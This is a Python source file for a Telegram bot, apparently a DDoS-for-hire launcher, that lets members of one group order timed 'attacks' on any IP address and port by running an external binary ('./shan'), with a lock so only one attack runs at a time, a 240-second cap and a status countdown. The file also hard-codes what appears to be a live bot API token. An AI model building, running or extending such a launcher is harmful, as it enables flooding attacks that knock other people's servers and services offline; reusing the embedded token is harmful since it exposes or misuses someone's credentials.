import asyncio
import subprocess
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import threading

# (Rest of the code remains unchanged)


# Global variables
attack_in_progress = False
remaining_time = 0
attack_lock = threading.Lock()

def restrict_to_group(func):
    """Decorator to ensure commands are only used in a specific group."""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        specific_group_id = -1002186135876  # Replace with your group's chat ID
        if update.effective_chat.id != specific_group_id:
            await context.bot.send_message(chat_id=update.effective_chat.id,
                                           text="This bot is usable only in a specific group. Join here: [Channel Link](https://t.me/your_channel_link)",
                                           parse_mode="Markdown")
            return
        return await func(update, context)
    return wrapper

@restrict_to_group
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Use /help to see all the functions. To initiate an attack, use the /attack command.")

@restrict_to_group
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "Available commands:\n"
        "/start - Introduction to the bot\n"
        "/help - List of commands\n"
        "/attack <ip> <port> <time> - Initiate an attack (time <= 240 sec)\n"
        "/status - Check attack status"
    )
    await update.message.reply_text(help_text)

@restrict_to_group
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_in_progress, remaining_time, attack_lock

    try:
        args = context.args
        if len(args) != 3:
            await update.message.reply_text("Usage: /attack <ip> <port> <time>")
            return

        ip, port, time_str = args
        try:
            time_duration = int(time_str)
        except ValueError:
            await update.message.reply_text("Time must be an integer.")
            return

        if time_duration > 240:
            await update.message.reply_text("Please use a time of 240 seconds or less.")
            return

        with attack_lock:
            if attack_in_progress:
                await update.message.reply_text(f"Please wait for the current attack to finish. Remaining time: {remaining_time} seconds.")
                return

            # Start the attack
            attack_in_progress = True
            remaining_time = time_duration
            await update.message.reply_text(f"Your attack invasion on {ip} {port} for {time_duration} seconds has started.")

        def run_attack():
            global attack_in_progress, remaining_time
            try:
                subprocess.run(["./shan", ip, port, str(time_duration)], check=True)
            except Exception as e:
                print(f"Error executing attack: {e}")
            finally:
                with attack_lock:
                    attack_in_progress = False
                    remaining_time = 0

        # Start the subprocess in a separate thread
        attack_thread = threading.Thread(target=run_attack)
        attack_thread.start()

        # Countdown timer for remaining time
        while remaining_time > 0:
            await asyncio.sleep(1)
            remaining_time -= 1

        await update.message.reply_text(f"Your attack on {ip} has concluded after {time_duration} seconds.")

    except Exception as e:
        await update.message.reply_text(f"An error occurred: {e}")

@restrict_to_group
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_in_progress, remaining_time

    with attack_lock:
        if attack_in_progress:
            await update.message.reply_text(f"An attack is currently in progress. Remaining time: {remaining_time} seconds.")
        else:
            await update.message.reply_text("The attack system is ready to go.")

def main():
    # Replace 'YOUR_TOKEN' with your bot's API token
    application = Application.builder().token("8032810151:AAFxY32Kudl9vZb8in_uQHxM0QEfRtnnv_k").build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("status", status))

    application.run_polling()

if __name__ == "__main__":
    main()
